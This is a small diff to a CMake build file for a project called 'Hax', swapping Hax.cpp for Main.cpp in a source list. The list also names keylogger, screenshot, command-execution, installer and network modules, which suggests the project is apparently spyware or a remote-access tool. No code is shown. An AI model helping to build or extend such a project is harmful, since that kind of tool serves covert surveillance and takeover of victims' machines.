@@ -4,14 +4,13 @@ project(Hax)
 set(SRC
     src/CommandExe.cpp
     src/CommandExe.h
-    src/Hax.cpp
-    src/Hax.h
     src/Info.cpp
     src/Info.h
     src/Installer.cpp
     src/Installer.h
     src/Keylogger.cpp
     src/Keylogger.h
+    src/Main.cpp
     src/Network.cpp
     src/Network.h
     src/Screenshot.cpp
